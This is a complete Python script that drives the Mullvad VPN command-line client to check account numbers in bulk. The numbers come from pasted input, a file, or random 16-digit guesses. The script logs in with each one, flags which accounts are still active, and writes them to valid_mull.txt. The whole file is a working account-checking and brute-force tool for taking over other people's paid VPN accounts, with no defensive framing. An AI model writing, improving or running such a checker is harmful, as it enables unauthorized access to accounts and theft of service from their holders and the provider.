import subprocess
import time
import re
import sys
import os
from datetime import datetime, timezone
import random

# Function to run Mullvad CLI commands
def run_mullvad_command(command):
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        return result.stdout, True
    except subprocess.CalledProcessError as e:
        return e.stderr, False

# Function to check if the expiry date is in the future
def is_expiry_in_future(expiry_date_str):
    try:
        # Parse the expiry date string into a datetime object
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d %H:%M:%S %z")
        # Get the current time in UTC
        current_time = datetime.now(timezone.utc)
        # Check if the expiry date is in the future
        return expiry_date > current_time
    except ValueError:
        return False

# Function to login with an account and get account info
def login_and_get_account_info(account_number, invalid, valid, valid_accounts):
    # Login with the account number
    login_command = ["mullvad", "account", "login", account_number]
    login_result, success = run_mullvad_command(login_command)
    
    # Check if login was successful
    if success and f"Mullvad account \"{account_number}\" set" in login_result:
        # Get account information
        get_account_command = ["mullvad", "account", "get"]
        account_info, success = run_mullvad_command(get_account_command)
        
        # Parse the expiry date
        if success:
            expiry_match = re.search(r"Expires at\s*:\s*(.+)", account_info)
            if expiry_match:
                expiry_date_str = expiry_match.group(1).strip()
                if is_expiry_in_future(expiry_date_str):
                    valid_accounts.append(f"{account_number} Expires at: {expiry_date_str}")
                    print(f"\033[92m{account_number} VALID - Expires at: {expiry_date_str}\033[0m")
                    valid += 1
                else:
                    print(f"\033[93m{account_number} EXPIRED - Expires at: {expiry_date_str}\033[0m")
                    invalid += 1
    else:
        print(f"\033[91m{account_number} INVALID\033[0m")
        invalid += 1
    
    return invalid, valid

# Function to handle manual input of account numbers
def manual_input(invalid, valid, valid_accounts):
    print("Enter account numbers (one per line). Press Enter twice to start checking:")
    account_numbers = []
    while True:
        line = input()
        if line == "":
            break
        account_numbers.append(line)
    for account_number in account_numbers:
        invalid, valid = login_and_get_account_info(account_number, invalid, valid, valid_accounts)
        time.sleep(1)  # Delay for 1 second before processing the next account
    return invalid, valid

# Function to handle file input of account numbers
def file_input(invalid, valid, valid_accounts):
    with open('acc.txt', 'r') as file:
        for line in file:
            account_number = line.strip()
            if account_number:
                invalid, valid = login_and_get_account_info(account_number, invalid, valid, valid_accounts)
                time.sleep(1)  # Delay for 1 second before processing the next account
    return invalid, valid

# Function to generate random account numbers and check them
def generate_accounts(invalid, valid, valid_accounts):
    print("Enter the number of accounts to generate:")
    try:
        count = int(input())
    except ValueError:
        print("Invalid number. Exiting.")
        return invalid, valid
    
    for _ in range(count):
        # Generate a random account number with 16 digits
        account_number = ''.join(random.choices('0123456789', k=16))
        invalid, valid = login_and_get_account_info(account_number, invalid, valid, valid_accounts)
        time.sleep(1)  # Delay for 1 second before processing the next account
    return invalid, valid

# Main function
def main():
    # Display options
    print("Choose an option:")
    print("1. Manual paste")
    print("2. File check")
    print("3. Generate accounts")
    
    # Get user choice
    choice = input("Enter your choice (1, 2, or 3): ")
    
    # Initialize counts and valid accounts list
    invalid = valid = 0
    valid_accounts = []
    
    # Clear the screen after choice
    os.system('cls' if os.name == 'nt' else 'clear')

    # Execute the chosen option
    if choice == "1":
        invalid, valid = manual_input(invalid, valid, valid_accounts)
    elif choice == "2":
        invalid, valid = file_input(invalid, valid, valid_accounts)
    elif choice == "3":
        invalid, valid = generate_accounts(invalid, valid, valid_accounts)
    else:
        print("Invalid choice. Exiting.")
        return
    
    # Save the valid accounts to valid_mull.txt
    with open('valid_mull.txt', 'w') as valid_file:
        for account in valid_accounts:
            valid_file.write(f"{account}\n")

    # Print out the valid accounts from the current run
    if valid_accounts:
        print("\nValid accounts from this run:")
        for account in valid_accounts:
            print(account)
    
    # Final count display
    loaded = invalid + valid
    print(f"\nCheck complete. LOADED: {loaded} | INVALID: {invalid} | VALID: {valid}")

if __name__ == "__main__":
    main()
